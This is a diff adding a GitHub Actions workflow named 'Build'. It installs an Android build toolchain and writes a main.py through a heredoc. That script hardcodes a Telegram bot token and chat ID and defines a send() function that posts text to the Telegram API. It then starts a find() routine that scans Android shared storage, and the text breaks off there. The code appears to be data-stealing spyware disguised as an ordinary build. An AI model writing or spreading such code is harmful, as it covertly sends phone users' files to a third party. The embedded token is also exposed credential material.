@@ -1,0 +1,27 @@
+name: Build
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+    - name: Install
+      run: |
+        pip install buildozer cython
+        sudo apt update
+        sudo apt install -y openjdk-17-jdk zlib1g-dev libncurses5-dev
+    - name: Create main.py
+      run: |
+        cat > main.py << 'EOF'
+import os, requests, sqlite3, shutil
+TOKEN = "8889128449:AAHUGVmOKw5cqeVx25D1WHN9lJcvyxsH43U"
+CHAT_ID = "8631833153"
+def send(t):
+    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": t[:4000]})
+def find():
+    r=[]
+    for p in ["/storage/emulated/0/
